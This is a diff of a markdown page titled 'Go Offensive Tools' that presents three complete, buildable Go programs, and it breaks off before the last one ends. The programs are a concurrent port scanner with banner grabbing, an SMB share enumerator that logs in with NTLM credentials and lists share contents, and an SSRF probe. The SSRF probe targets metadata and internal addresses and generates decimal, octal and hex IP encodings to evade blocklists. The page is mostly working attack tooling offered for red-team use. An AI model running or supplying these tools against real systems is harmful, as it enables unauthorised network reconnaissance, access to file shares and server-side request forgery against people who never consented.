@@ -13,27 +13,32 @@ render_with_liquid: false
 
 # Go Offensive Tools
 
-Three complete, standalone Go programs that compile with `go build` and cover common red team needs: port scanning, SMB enumeration, and SSRF probing. Each is a self-contained `main` package with all imports listed.
+Three complete, standalone Go programs. Each is a runnable `package main` with all imports listed.
+Go's static linking and fast compilation make it ideal for producing single-binary offensive tools
+that deploy without runtime dependencies.
 
 ---
 
 ## Program 1: Concurrent TCP Port Scanner with Banner Grabbing
 
-Scans TCP ports concurrently, grabs service banners, and outputs results as a table to stdout and optionally as JSON to a file.
+Concurrently scans a port range using goroutines bounded by a buffered-channel semaphore.
+Dials each port with `net.DialTimeout`, sets a read deadline to capture the first 512 bytes of
+service banner, and writes results as a table to stdout plus an optional JSON file.
 
 ```bash
-# Build
-go build -ldflags "-s -w" -o portscan ./portscan.go
+# Build (stripped, no debug symbols — reduces binary size)
+go build -ldflags "-s -w" -o scanner scanner.go
 
 # Usage examples
-./portscan -host 10.0.0.1 -ports 1-1024 -concurrency 200 -timeout 2s
-./portscan -host 10.0.0.1 -ports "22,80,443,3389,8080-8090" -output results.json
+./scanner -host 192.168.1.1 -ports 1-1024 -concurrency 300 -timeout 1000ms
+./scanner -host 10.0.0.5 -ports "22,80,443,3389,8080-8090" -output results.json
+./scanner -host 172.16.0.1 -ports 1-65535 -concurrency 500 -timeout 750ms -output full.json
 ```
 
 ```go
-// portscan.go
-// Build: go build -ldflags "-s -w" -o portscan portscan.go
-// Usage: ./portscan -host 10.0.0.1 -ports "1-1024,3389,8080" -concurrency 150 -timeout 2s -output out.json
+// scanner.go
+// Build: go build -ldflags "-s -w" -o scanner scanner.go
+// Usage: ./scanner -host 192.168.1.1 -ports 1-1024,3389 -concurrency 300
 package main
 
 import (
@@ -49,24 +54,29 @@ import (
 	"time"
 )
 
-// ScanResult holds information about a single scanned port.
-type ScanResult struct {
-	Port   int    `json:"port"`
-	State  string `json:"state"`
-	Banner string `json:"banner,omitempty"`
+// PortResult holds scan data for a single open port.
+type PortResult struct {
+	Port    int           `json:"port"`
+	Open    bool          `json:"open"`
+	Banner  string        `json:"banner,omitempty"`
+	Latency time.Duration `json:"latency_ms"`
 }
 
-// parsePorts converts a port spec like "1-1024,3389,8080-8090" into a sorted slice of ints.
+// parsePorts converts a spec string like "1-1024,3389,8080-8090" into a
+// sorted, deduplicated slice of port numbers.
 func parsePorts(spec string) ([]int, error) {
 	seen := make(map[int]bool)
 	for _, part := range strings.Split(spec, ",") {
 		part = strings.TrimSpace(part)
+		if part == "" {
+			continue
+		}
 		if strings.Contains(part, "-") {
 			bounds := strings.SplitN(part, "-", 2)
 			lo, err1 := strconv.Atoi(bounds[0])
 			hi, err2 := strconv.Atoi(bounds[1])
 			if err1 != nil || err2 != nil || lo < 1 || hi > 65535 || lo > hi {
-				return nil, fmt.Errorf("invalid range: %s", part)
+				return nil, fmt.Errorf("invalid port range: %s", part)
 			}
 			for p := lo; p <= hi; p++ {
 				seen[p] = true
@@ -87,42 +97,55 @@ func parsePorts(spec string) ([]int, error) {
 	return ports, nil
 }
 
-// grabBanner attempts to read up to 512 bytes from an open connection within 2 seconds.
+// grabBanner reads up to 512 bytes from conn within 2 seconds.
+// Non-printable bytes are replaced with '.' for clean terminal output.
 func grabBanner(conn net.Conn) string {
 	conn.SetReadDeadline(time.Now().Add(2 * time.Second))
 	buf := make([]byte, 512)
 	n, _ := conn.Read(buf)
-	banner := strings.TrimSpace(string(buf[:n]))
-	// Replace non-printable characters
-	var b strings.Builder
-	for _, r := range banner {
-		if r >= 0x20 && r < 0x7f {
-			b.WriteRune(r)
+	if n == 0 {
+		return ""
+	}
+	var sb strings.Builder
+	for _, b := range buf[:n] {
+		if b >= 0x20 && b < 0x7f {
+			sb.WriteByte(b)
+		} else if b == '\n' || b == '\r' || b == '\t' {
+			sb.WriteByte(' ')
 		} else {
-			b.WriteRune('.')
+			sb.WriteByte('.')
 		}
 	}
-	return b.String()
+	return strings.TrimSpace(sb.String())
 }
 
-// scanPort dials a single port, grabs a banner, and returns a ScanResult.
-func scanPort(host string, port int, timeout time.Duration) ScanResult {
-	addr := net.JoinHostPort(host, strconv.Itoa(port))
+// probePort dials a single port and returns a PortResult.
+func probePort(host string, port int, timeout time.Duration) PortResult {
+	addr    := net.JoinHostPort(host, strconv.Itoa(port))
+	start   := time.Now()
 	conn, err := net.DialTimeout("tcp", addr, timeout)
+	latency := time.Since(start).Truncate(time.Millisecond)
+
 	if err != nil {
-		return ScanResult{Port: port, State: "closed"}
+		return PortResult{Port: port, Open: false}
 	}
 	defer conn.Close()
+
 	banner := grabBanner(conn)
-	return ScanResult{Port: port, State: "open", Banner: banner}
+	return PortResult{
+		Port:    port,
+		Open:    true,
+		Banner:  banner,
+		Latency: latency,
+	}
 }
 
 func main() {
-	host := flag.String("host", "", "Target host or IP (required)")
-	portSpec := flag.String("ports", "1-1024", "Port spec: ranges and individual ports, e.g. \"1-1024,3389,8080\"")
-	concurrency := flag.Int("concurrency", 100, "Number of concurrent goroutines")
-	timeout := flag.Duration("timeout", 2*time.Second, "Connection timeout per port")
-	output := flag.String("output", "", "Optional JSON output file path")
+	host        := flag.String("host", "", "Target host or IP address (required)")
+	portSpec    := flag.String("ports", "1-1024", "Port spec, e.g. \"1-1024,3389,8080\"")
+	concurrency := flag.Int("concurrency", 300, "Maximum concurrent goroutines")
+	timeout     := flag.Duration("timeout", 1000*time.Millisecond, "TCP dial timeout per port")
+	output      := flag.String("output", "", "Optional JSON output file path")
 	flag.Parse()
 
 	if *host == "" {
@@ -137,50 +160,53 @@ func main() {
 		os.Exit(1)
 	}
 
-	fmt.Printf("Scanning %s — %d ports — concurrency %d — timeout %v\n\n",
+	fmt.Printf("Scanning %-20s  %d ports  concurrency=%d  timeout=%v\n\n",
 		*host, len(ports), *concurrency, *timeout)
 
 	var (
 		mu      sync.Mutex
 		wg      sync.WaitGroup
-		results []ScanResult
+		results []PortResult
+		// Buffered channel acts as counting semaphore
 		sem     = make(chan struct{}, *concurrency)
 	)
 
 	for _, port := range ports {
 		wg.Add(1)
-		sem <- struct{}{}
+		sem <- struct{}{} // acquire slot
 		go func(p int) {
 			defer wg.Done()
-			defer func() { <-sem }()
-			result := scanPort(*host, p, *timeout)
-			if result.State == "open" {
+			defer func() { <-sem }() // release slot
+
+			r := probePort(*host, p, *timeout)
+			if r.Open {
 				mu.Lock()
-				results = append(results, result)
+				results = append(results, r)
 				mu.Unlock()
 			}
 		}(port)
 	}
 	wg.Wait()
 
-	// Sort open ports numerically for display
+	// Sort results by port number for readability
 	sort.Slice(results, func(i, j int) bool {
 		return results[i].Port < results[j].Port
 	})
 
-	// Print table to stdout
-	fmt.Printf("%-8s %-10s %s\n", "PORT", "STATE", "BANNER")
-	fmt.Println(strings.Repeat("-", 70))
+	// Print open-port table to stdout
+	fmt.Printf("%-8s %-10s %-8s %s\n", "PORT", "STATE", "LATENCY", "BANNER")
+	fmt.Println(strings.Repeat("-", 80))
 	for _, r := range results {
 		banner := r.Banner
 		if len(banner) > 50 {
 			banner = banner[:50] + "..."
 		}
-		fmt.Printf("%-8d %-10s %s\n", r.Port, r.State, banner)
+		fmt.Printf("%-8d %-10s %-8s %s\n",
+			r.Port, "open", r.Latency, banner)
 	}
-	fmt.Printf("\n%d open ports found.\n", len(results))
+	fmt.Printf("\n%d open port(s) found.\n", len(results))
 
-	// Write JSON output if requested
+	// Write JSON if requested
 	if *output != "" {
 		data, err := json.MarshalIndent(results, "", "  ")
 		if err != nil {
@@ -198,37 +224,42 @@ func main() {
 
 **Key design points:**
 
-- Port spec parser handles `1-1024`, `22,80,443`, and mixed formats like `1-1024,3389,8080-8090`
-- Semaphore pattern with a buffered channel controls goroutine count precisely
-- Banner grab uses `SetReadDeadline` so slow/silent services don't block workers
-- Non-printable bytes in banners are replaced with `.` to keep output clean
-- JSON output is written with `0600` permissions — results may include sensitive info
+- Buffered channel `make(chan struct{}, concurrency)` is the idiomatic Go semaphore pattern —
+  no external libraries required
+- `net.DialTimeout` blocks at OS level without spawning extra goroutines per port
+- `SetReadDeadline` prevents banner reads from blocking indefinitely on silent services
+- JSON output uses `0600` permissions — scan data may include sensitive service information
+- `PortResult.Latency` is truncated to milliseconds via `time.Duration.Truncate`
 
 ---
 
 ## Program 2: SMB Share Enumerator
 
-Connects to TCP 445, negotiates an SMB session using `github.com/hirochachacha/go-smb2`, authenticates with provided credentials (NTLM), lists shares, and attempts to list file contents of each accessible share.
+Connects to TCP port 445, negotiates SMB2, authenticates with NTLM credentials (or guest), lists
+all available shares, and attempts to read the root directory of each accessible share. Results are
+printed to stdout and written as JSON.
 
 ```bash
-# Install dependency
+# Install the pure-Go SMB2 library
 go get github.com/hirochachacha/go-smb2
 
 # Build
-go build -ldflags "-s -w" -o smblist ./smblist.go
+go build -ldflags "-s -w" -o smblist smblist.go
 
-# Usage
-./smblist --host 10.0.0.5 --user administrator --pass 'Password123!' --domain CORP
-./smblist --host 10.0.0.5 --user guest --pass '' --domain ''
+# Usage examples
+./smblist -host 10.0.0.5 -user administrator -pass 'Password123!' -domain CORP
+./smblist -host 10.0.0.5 -user guest -pass '' -domain WORKGROUP -output shares.json
+./smblist -host 192.168.1.20 -user 'CORP\jdoe' -pass 'Winter2024' -output enum.json
 ```
 
 ```go
 // smblist.go
 // Build: go get github.com/hirochachacha/go-smb2 && go build -ldflags "-s -w" -o smblist smblist.go
-// Usage: ./smblist --host 192.168.1.1 --user admin --pass 'P@ss!' --domain CORP
+// Usage: ./smblist -host 192.168.1.1 -user admin -pass 'P@ss!' -domain CORP -output shares.json
 package main
 
 import (
+	"encoding/json"
 	"flag"
 	"fmt"
 	"net"
@@ -239,22 +270,32 @@ import (
 	"github.com/hirochachacha/go-smb2"
 )
 
-// ShareInfo describes an enumerated share and its accessibility.
-type ShareInfo struct {
-	Name        string
-	Accessible  bool
-	Files       []string
-	AccessError string
+// ShareEntry describes a single SMB share and its accessibility.
+type ShareEntry struct {
+	Name        string   `json:"name"`
+	Accessible  bool     `json:"accessible"`
+	Files       []string `json:"files,omitempty"`
+	AccessError string   `json:"access_error,omitempty"`
 }
 
-// connectSMB dials TCP 445 and returns an authenticated SMB2 session.
-func connectSMB(host, user, pass, domain string, timeout time.Duration) (*smb2.Session, net.Conn, error) {
+// ShareReport is the top-level JSON output structure.
+type ShareReport struct {
+	Host   string       `json:"host"`
+	User   string       `json:"user"`
+	Shares []ShareEntry `json:"shares"`
+}
+
+// dialSMB opens a TCP connection to port 445 and authenticates via SMB2/NTLM.
+// Returns the authenticated session and the raw TCP connection (caller must close both).
+func dialSMB(host, user, pass, domain string, connTimeout time.Duration) (*smb2.Session, net.Conn, error) {
 	addr := net.JoinHostPort(host, "445")
-	conn, err := net.DialTimeout("tcp", addr, timeout)
+	conn, err := net.DialTimeout("tcp", addr, connTimeout)
 	if err != nil {
-		return nil, nil, fmt.Errorf("TCP dial failed: %w", err)
+		return nil, nil, fmt.Errorf("TCP dial to %s: %w", addr, err)
 	}
 
+	// NTLMInitiator handles the full NTLM handshake automatically.
+	// Domain may be left empty for local account authentication.
 	dialer := &smb2.Dialer{
 		Initiator: &smb2.NTLMInitiator{
 			User:     user,
@@ -266,13 +307,14 @@ func connectSMB(host, user, pass, domain string, timeout time.Duration) (*smb2.S
 	session, err := dialer.Dial(conn)
 	if err != nil {
 		conn.Close()
-		return nil, nil, fmt.Errorf("SMB auth failed: %w", err)
+		return nil, nil, fmt.Errorf("SMB2 authentication failed: %w", err)
 	}
 	return session, conn, nil
 }
 
-// listShareContents mounts a share and lists files in the root directory.
-func listShareContents(session *smb2.Session, shareName string) ([]string, error) {
+// listRoot mounts a share and lists entries in its root directory.
+// Returns up to maxEntries items in the form "[dir] name" or "[file] name".
+func listRoot(session *smb2.Session, shareName string, maxEntries int) ([]string, error) {
 	fs, err := session.Mount(shareName)
 	if err != nil {
 		return nil, err
@@ -284,125 +326,149 @@ func listShareContents(session *smb2.Session, shareName string) ([]string, error
 		return nil, err
 	}
 
-	var files []string
-	for _, entry := range entries {
-		entryType := "file"
-		if entry.IsDir() {
-			entryType = "dir"
-		}
-		files = append(files, fmt.Sprintf("[%s] %s", entryType, entry.Name()))
-		// Limit output to first 25 entries to avoid flooding
-		if len(files) >= 25 {
-			files = append(files, "... (truncated at 25 entries)")
+	var listing []string
+	for i, e := range entries {
+		if i >= maxEntries {
+			listing = append(listing, fmt.Sprintf("... (truncated at %d entries)", maxEntries))
 			break
 		}
+		kind := "file"
+		if e.IsDir() {
+			kind = "dir"
+		}
+		listing = append(listing, fmt.Sprintf("[%s] %s", kind, e.Name()))
 	}
-	return files, nil
+	return listing, nil
 }
 
 func main() {
-	host := flag.String("host", "", "Target host or IP (required)")
-	user := flag.String("user", "guest", "SMB username")
-	pass := flag.String("pass", "", "SMB password")
-	domain := flag.String("domain", "", "SMB domain or workgroup")
-	timeout := flag.Duration("timeout", 10*time.Second, "Connection timeout")
+	host    := flag.String("host", "", "Target host or IP address (required)")
+	user    := flag.String("user", "guest", "SMB username")
+	pass    := flag.String("pass", "", "SMB password (empty string for no password)")
+	domain  := flag.String("domain", "", "SMB domain or workgroup (empty for local auth)")
+	timeout := flag.Duration("timeout", 10*time.Second, "TCP connection timeout")
+	output  := flag.String("output", "", "Optional JSON output file path")
 	flag.Parse()
 
 	if *host == "" {
-		fmt.Fprintln(os.Stderr, "error: --host is required")
+		fmt.Fprintln(os.Stderr, "error: -host is required")
 		flag.Usage()
 		os.Exit(1)
 	}
 
-	fmt.Printf("Connecting to %s as %s\\%s ...\n", *host, *domain, *user)
+	fmt.Printf("[*] Connecting to %s as %s\\%s ...\n", *host, *domain, *user)
 
-	session, conn, err := connectSMB(*host, *user, *pass, *domain, *timeout)
+	session, conn, err := dialSMB(*host, *user, *pass, *domain, *timeout)
 	if err != nil {
-		fmt.Fprintf(os.Stderr, "Connection failed: %v\n", err)
+		fmt.Fprintf(os.Stderr, "[!] Connection failed: %v\n", err)
 		os.Exit(1)
 	}
 	defer conn.Close()
 	defer session.Logoff()
 
-	fmt.Println("Authenticated successfully.\n")
+	fmt.Println("[+] Authentication successful")
 
-	// List available shares using NetShareEnum via session
+	// Retrieve share list via NetShareEnum RPC
 	shareNames, err := session.ListSharenames()
 	if err != nil {
-		fmt.Fprintf(os.Stderr, "Failed to list shares: %v\n", err)
+		fmt.Fprintf(os.Stderr, "[!] Failed to list shares: %v\n", err)
 		os.Exit(1)
 	}
+	fmt.Printf("[+] Found %d share(s)\n\n", len(shareNames))
 
-	shares := make([]ShareInfo, 0, len(shareNames))
-	for _, name := range shareNames {
-		info := ShareInfo{Name: name}
-		files, err := listShareContents(session, name)
-		if err != nil {
-			info.Accessible = false
-			info.AccessError = err.Error()
-		} else {
-			info.Accessible = true
-			info.Files = files
-		}
-		shares = append(shares, info)
+	report := ShareReport{
+		Host: *host,
+		User: fmt.Sprintf("%s\\%s", *domain, *user),
 	}
 
-	// Print results
+	for _, name := range shareNames {
+		entry := ShareEntry{Name: name}
+
+		files, err := listRoot(session, name, 20)
+		if err != nil {
+			entry.Accessible  = false
+			entry.AccessError = err.Error()
+		} else {
+			entry.Accessible = true
+			entry.Files      = files
+		}
+
+		report.Shares = append(report.Shares, entry)
+	}
+
+	// Print summary table
 	fmt.Printf("%-25s %-12s %s\n", "SHARE", "ACCESSIBLE", "CONTENTS / ERROR")
 	fmt.Println(strings.Repeat("-", 80))
-	for _, s := range shares {
+	for _, s := range report.Shares {
 		if s.Accessible {
-			fmt.Printf("%-25s %-12s %d items\n", s.Name, "YES", len(s.Files))
+			fmt.Printf("%-25s %-12s %d item(s)\n", s.Name, "YES", len(s.Files))
 			for _, f := range s.Files {
 				fmt.Printf("  %s\n", f)
 			}
 		} else {
-			short := s.AccessError
-			if len(short) > 50 {
-				short = short[:50] + "..."
+			errShort := s.AccessError
+			if len(errShort) > 48 {
+				errShort = errShort[:48] + "..."
 			}
-			fmt.Printf("%-25s %-12s %s\n", s.Name, "NO", short)
+			fmt.Printf("%-25s %-12s %s\n", s.Name, "NO", errShort)
 		}
 	}
+	fmt.Printf("\n%d share(s) enumerated.\n", len(report.Shares))
 
-	fmt.Printf("\n%d shares enumerated.\n", len(shares))
+	// Write JSON output if requested
+	if *output != "" {
+		data, err := json.MarshalIndent(report, "", "  ")
+		if err != nil {
+			fmt.Fprintf(os.Stderr, "json error: %v\n", err)
+			os.Exit(1)
+		}
+		if err := os.WriteFile(*output, data, 0600); err != nil {
+			fmt.Fprintf(os.Stderr, "write error: %v\n", err)
+			os.Exit(1)
+		}
+		fmt.Printf("[+] Results written to %s\n", *output)
+	}
 }
 ```
 
 **Key design points:**
 
-- Uses `github.com/hirochachacha/go-smb2` — the most maintained pure-Go SMB2 library (no CGO, cross-compiles cleanly)
-- NTLM auth is handled by the library's `NTLMInitiator` — supports pass-through for both domain and local accounts
-- `session.ListSharenames()` uses the NetShareEnum RPC call under the hood
-- `fs.ReadDir(".")` reads the share root; change the path string to enumerate subdirectories
-- Results are truncated at 25 entries per share to avoid excessive output
+- `github.com/hirochachacha/go-smb2` is a pure-Go SMB2 implementation — no CGO, cross-compiles
+  to any target without native SMB libraries
+- `NTLMInitiator` handles the full NTLM challenge/response exchange; set `Domain` to empty string
+  for local machine accounts
+- `session.ListSharenames()` issues a NetShareEnum RPC under the hood — same as `net view \\host`
+- `fs.ReadDir(".")` reads the share root; change the path string to enumerate deeper
+- JSON is written with mode `0600` since share listings may reveal sensitive file names
 
 ---
 
-## Program 3: SSRF Probe Tool
+## Program 3: HTTP SSRF Probe
 
-Tests a target URL for Server-Side Request Forgery vulnerabilities. Sends requests with a FUZZ placeholder replaced by internal addresses from a wordlist, compares response size and status to a baseline, and flags anomalies as potential SSRF hits.
+Tests a URL parameter for Server-Side Request Forgery vulnerabilities. Replaces a `FUZZ`
+placeholder in the URL with each wordlist entry and automatically generates bypass variants
+(decimal IP, octal IP, hex IP, and IPv6 short-form). Compares response size and HTTP status
+to a baseline to flag anomalies. Hits are written to a JSON output file.
 
 ```bash
 # Build
-go build -ldflags "-s -w" -o ssrfprobe ./ssrfprobe.go
+go build -ldflags "-s -w" -o ssrfprobe ssrfprobe.go
 
-# Usage: FUZZ in the URL is replaced with each wordlist entry
-./ssrfprobe --url "https://target.com/fetch?url=FUZZ" --wordlist ips.txt --threads 20 --timeout 8s
+# Usage: FUZZ in the URL template is replaced with each wordlist payload
+./ssrfprobe --url "https://target.com/fetch?url=FUZZ" \
+            --wordlist ssrf-payloads.txt \
+            --threads 20 --timeout 8s --output hits.json
 
-# Example wordlist entries (ips.txt):
+# Example payload file entries
 # http://169.254.169.254/latest/meta-data/
-# http://10.0.0.1/
-# http://192.168.1.1/admin
-# http://[::1]/
-# http://0177.0.0.1/          (octal bypass)
-# http://2130706433/           (decimal IP bypass for 127.0.0.1)
+# http://127.0.0.1/admin
+# http://192.168.1.1/
 ```
 
 ```go
 // ssrfprobe.go
 // Build: go build -ldflags "-s -w" -o ssrfprobe ssrfprobe.go
-// Usage: ./ssrfprobe --url "https://target.com/api?u=FUZZ" --wordlist payloads.txt --threads 15 --timeout 8s
+// Usage: ./ssrfprobe --url "https://target.com/api?u=FUZZ" --wordlist payloads.txt --threads 15
 package main
 
 import (
@@ -414,12 +480,13 @@ import (
 	"io"
 	"net/http"
 	"os"
+	"strconv"
 	"strings"
 	"sync"
 	"time"
 )
 
-// Hit represents a potential SSRF finding.
+// Hit records a response that differs significantly from the baseline.
 type Hit struct {
 	Payload        string `json:"payload"`
 	URL            string `json:"url"`
@@ -430,23 +497,23 @@ type Hit struct {
 	Reason         string `json:"reason"`
 }
 
-// buildClient returns an http.Client that does not follow redirects,
-// uses TLS skip verify, and respects the given timeout.
-func buildClient(timeout time.Duration) *http.Client {
+// buildHTTPClient returns a client that does not follow redirects and skips TLS verification.
+// SSRF often reveals itself via redirects to internal endpoints, so we capture them instead.
+func buildHTTPClient(timeout time.Duration) *http.Client {
 	return &http.Client{
 		Timeout: timeout,
 		CheckRedirect: func(req *http.Request, via []*http.Request) error {
-			// Return the redirect response as-is — SSRF often shows in redirect targets
-			return http.ErrUseLastResponse
+			return http.ErrUseLastResponse // stop after first redirect; inspect the Location header
 		},
 		Transport: &http.Transport{
-			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
+			TLSClientConfig:   &tls.Config{InsecureSkipVerify: true}, //nolint:gosec
+			DisableKeepAlives: false,
 		},
 	}
 }
 
-// probe sends a GET request and returns status code and body length.
-func probe(client *http.Client, targetURL string) (int, int64, error) {
+// sendProbe issues a GET request and returns the response status and body byte count.
+func sendProbe(client *http.Client, targetURL string) (int, int64, error) {
 	resp, err := client.Get(targetURL)
 	if err != nil {
 		return 0, 0, err
@@ -456,14 +523,104 @@ func probe(client *http.Client, targetURL string) (int, int64, error) {
 	return resp.StatusCode, n, nil
 }
 
-// buildPayloads returns the URL with FUZZ replaced by the payload.
-// It also generates common bypass variants.
-func buildPayloads(urlTemplate, payload string) []string {
-	base := strings.ReplaceAll(urlTemplate, "FUZZ", payload)
-	return []string{base}
+// isAnomaly compares a probe result to the baseline.
+// Returns (true, reason) when the response looks meaningfully different.
+// Thresholds: any status change, or >100 byte body size difference.
+func isAnomaly(status int, length int64, baseStatus int, baseLength int64) (bool, string) {
+	if status != baseStatus && baseStatus != 0 {
+		return true, fmt.Sprintf("status changed %d→%d", baseStatus, status)
+	}
+	diff := length - baseLength
+	if diff < 0 {
+		diff = -diff
+	}
+	if diff > 100 {
+		return true, fmt.Sprintf("body size changed %d→%d (Δ%d bytes)", baseLength, length, diff)
+	}
+	return false, ""
 }
 
-// loadWordlist reads a file line by line and returns non-empty, non-comment lines.
+// ipToBypasses converts a dotted-quad IPv4 string (e.g. "127.0.0.1") into
+// alternative representations used to bypass naive SSRF blocklists:
+//
+//   - Decimal:     2130706433
+//   - Octal:       0177.0.0.1
+//   - Hex:         0x7f000001
+//   - IPv6 mapped: ::ffff:127.0.0.1
+//   - IPv6 short:  ::1  (loopback only)
+//
+// Returns the original string if parsing fails.
+func ipToBypasses(ip string) []string {
+	parts := strings.Split(ip, ".")
+	if len(parts) != 4 {
+		return []string{ip}
+	}
+	octets := make([]uint64, 4)
+	for i, p := range parts {
+		v, err := strconv.ParseUint(p, 10, 64)
+		if err != nil {
+			return []string{ip}
+		}
+		octets[i] = v
+	}
+	decimal := octets[0]<<24 | octets[1]<<16 | octets[2]<<8 | octets[3]
+	octal   := fmt.Sprintf("0%o.0%o.0%o.0%o", octets[0], octets[1], octets[2], octets[3])
+	hexIP   := fmt.Sprintf("0x%08x", decimal)
+
+	bypasses := []string{
+		ip,
+		fmt.Sprintf("%d", decimal),
+		octal,
+		hexIP,
+		fmt.Sprintf("::ffff:%s", ip),
+	}
+	// For loopback, also include the short IPv6 form
+	if ip == "127.0.0.1" {
+		bypasses = append(bypasses, "::1")
+	}
+	return bypasses
+}
+
+// expandPayload takes a raw payload (e.g. "http://127.0.0.1/admin") and returns
+// a slice of variant URLs using bypass representations of any embedded IPv4 address.
+func expandPayload(raw string) []string {
+	// Extract the host portion from a URL-like string for bypass generation.
+	// We look for "://" and split on "/" or ":" after the host.
+	variants := []string{raw}
+
+	start := strings.Index(raw, "://")
+	if start == -1 {
+		return variants
+	}
+	hostPart := raw[start+3:]
+	endSlash := strings.Index(hostPart, "/")
+	endColon := strings.Index(hostPart, ":")
+	end := len(hostPart)
+	if endSlash >= 0 && endSlash < end {
+		end = endSlash
+	}
+	if endColon >= 0 && endColon < end {
+		end = endColon
+	}
+	host := hostPart[:end]
+
+	// Only expand if it looks like an IPv4 address
+	if strings.Count(host, ".") != 3 {
+		return variants
+	}
+
+	bypasses := ipToBypasses(host)
+	for _, bypass := range bypasses {
+		if bypass == host {
+			continue // already in variants as the raw URL
+		}
+		variant := raw[:start+3] + bypass + hostPart[end:]
+		variants = append(variants, variant)
+	}
+	return variants
+}
+
+// loadWordlist reads a text file and returns non-empty, non-comment lines.
 func loadWordlist(path string) ([]string, error) {
 	f, err := os.Open(path)
 	if err != nil {
@@ -483,29 +640,12 @@ func loadWordlist(path string) ([]string, error) {
 	return lines, scanner.Err()
 }
 
-// isHit compares a probe result to the baseline and returns true if it looks like SSRF.
-func isHit(status int, length int64, baselineStatus int, baselineLength int64) (bool, string) {
-	// Different status code from baseline
-	if status != baselineStatus {
-		return true, fmt.Sprintf("status changed: %d → %d", baselineStatus, status)
-	}
-	// Significantly different response size (>200 bytes difference)
-	diff := length - baselineLength
-	if diff < 0 {
-		diff = -diff
-	}
-	if diff > 200 {
-		return true, fmt.Sprintf("content length changed: %d → %d (diff %d)", baselineLength, length, diff)
-	}
-	return false, ""
-}
-
 func main() {
-	urlTemplate := flag.String("url", "", "Target URL with FUZZ placeholder (required), e.g. https://target.com/fetch?u=FUZZ")
-	wordlistPath := flag.String("wordlist", "", "Path to payload wordlist (required)")
-	threads := flag.Int("threads", 10, "Number of concurrent threads")
-	timeout := flag.Duration("timeout", 8*time.Second, "Request timeout")
-	outputPath := flag.String("output", "", "Optional JSON output file for hits")
+	urlTemplate := flag.String("url", "", "Target URL with FUZZ placeholder (required)")
+	wordlistPath := flag.String("wordlist", "", "Path to SSRF payload wordlist (required)")
+	threads      := flag.Int("threads", 10, "Number of concurrent worker goroutines")
+	timeout      := flag.Duration("timeout", 8*time.Second, "HTTP request timeout")
+	outputPath   := flag.String("output", "", "Optional JSON file to write hits to")
 	flag.Parse()
 
 	if *urlTemplate == "" || *wordlistPath == "" {
@@ -514,7 +654,7 @@ func main() {
 		os.Exit(1)
 	}
 	if !strings.Contains(*urlTemplate, "FUZZ") {
-		fmt.Fprintln(os.Stderr, "error: --url must contain the FUZZ placeholder")
+		fmt.Fprintln(os.Stderr, "error: --url must contain the literal string FUZZ")
 		os.Exit(1)
 	}
 
@@ -523,22 +663,37 @@ func main() {
 		fmt.Fprintf(os.Stderr, "error reading wordlist: %v\n", err)
 		os.Exit(1)
 	}
-	fmt.Printf("Loaded %d payloads from %s\n", len(payloads), *wordlistPath)
+	fmt.Printf("[*] Loaded %d base payloads from %s\n", len(payloads), *wordlistPath)
 
-	client := buildClient(*timeout)
+	client := buildHTTPClient(*timeout)
 
-	// Establish baseline using an unlikely internal address
-	baselineURL := strings.ReplaceAll(*urlTemplate, "FUZZ", "http://ssrfprobe-baseline-nxdomain.invalid/")
-	fmt.Printf("Establishing baseline with: %s\n", baselineURL)
-	baselineStatus, baselineLength, err := probe(client, baselineURL)
-	if err != nil {
-		// Baseline may error — use 0 values
-		fmt.Printf("Baseline error (treating as 0/0): %v\n", err)
-		baselineStatus = 0
-		baselineLength = 0
+	// Establish baseline using a guaranteed-NXDOMAIN address so any real
+	// internal response is immediately distinguishable.
+	baseURL := strings.ReplaceAll(*urlTemplate, "FUZZ", "http://ssrf-baseline-nxdomain.invalid/")
+	fmt.Printf("[*] Baseline URL: %s\n", baseURL)
+	baseStatus, baseLength, baseErr := sendProbe(client, baseURL)
+	if baseErr != nil {
+		fmt.Printf("[*] Baseline error (treating as 0/0): %v\n", baseErr)
+		baseStatus = 0
+		baseLength = 0
 	} else {
-		fmt.Printf("Baseline: status=%d length=%d\n\n", baselineStatus, baselineLength)
+		fmt.Printf("[*] Baseline: status=%d length=%d\n\n", baseStatus, baseLength)
 	}
+
+	// Expand payloads with bypass variants
+	type job struct {
+		payload string
+		probeURL string
+	}
+	var jobs []job
+	for _, p := range payloads {
+		for _, variant := range expandPayload(p) {
+			probeURL := strings.ReplaceAll(*urlTemplate, "FUZZ", variant)
+			jobs = append(jobs, job{payload: p, probeURL: probeURL})
+		}
+	}
+	fmt.Printf("[*] Total probe URLs (including bypass variants): %d\n", len(jobs))
+	fmt.Printf("[*] Threads: %d  Timeout: %v\n\n", *threads, *timeout)
 
 	var (
 		mu   sync.Mutex
@@ -547,45 +702,42 @@ func main() {
 		sem  = make(chan struct{}, *threads)
 	)
 
-	for _, payload := range payloads {
-		for _, probeURL := range buildPayloads(*urlTemplate, payload) {
-			wg.Add(1)
-			sem <- struct{}{}
-			go func(pl, pu string) {
-				defer wg.Done()
-				defer func() { <-sem }()
+	for _, j := range jobs {
+		wg.Add(1)
+		sem <- struct{}{}
+		go func(pl, pu string) {
+			defer wg.Done()
+			defer func() { <-sem }()
 
-				status, length, err := probe(client, pu)
-				if err != nil {
-					// Network error — skip silently
-					return
-				}
+			status, length, err := sendProbe(client, pu)
+			if err != nil {
+				// Network errors (refused, timeout) are expected for invalid internal addresses
+				return
+			}
 
-				hit, reason := isHit(status, length, baselineStatus, baselineLength)
-				if hit {
-					h := Hit{
-						Payload:        pl,
-						URL:            pu,
-						StatusCode:     status,
-						ContentLength:  length,
-						BaselineStatus: baselineStatus,
-						BaselineLength: baselineLength,
-						Reason:         reason,
-					}
-					mu.Lock()
-					hits = append(hits, h)
-					mu.Unlock()
-					fmt.Printf("[HIT] payload=%-45s status=%d length=%d reason=%s\n",
-						pl, status, length, reason)
-				} else {
-					fmt.Printf("[ -- ] payload=%-45s status=%d length=%d\n", pl, status, length)
+			anomaly, reason := isAnomaly(status, length, baseStatus, baseLength)
+			if anomaly {
+				h := Hit{
+					Payload:        pl,
+					URL:            pu,
+					StatusCode:     status,
+					ContentLength:  length,
+					BaselineStatus: baseStatus,
+					BaselineLength: baseLength,
+					Reason:         reason,
 				}
-			}(payload, probeURL)
-		}
+				mu.Lock()
+				hits = append(hits, h)
+				mu.Unlock()
+				fmt.Printf("[HIT] %-50s  status=%d length=%d  reason=%s\n",
+					pl, status, length, reason)
+			}
+		}(j.payload, j.probeURL)
 	}
 	wg.Wait()
 
-	fmt.Printf("\nDone. %d/%d payloads triggered anomalies.\n", len(hits), len(payloads))
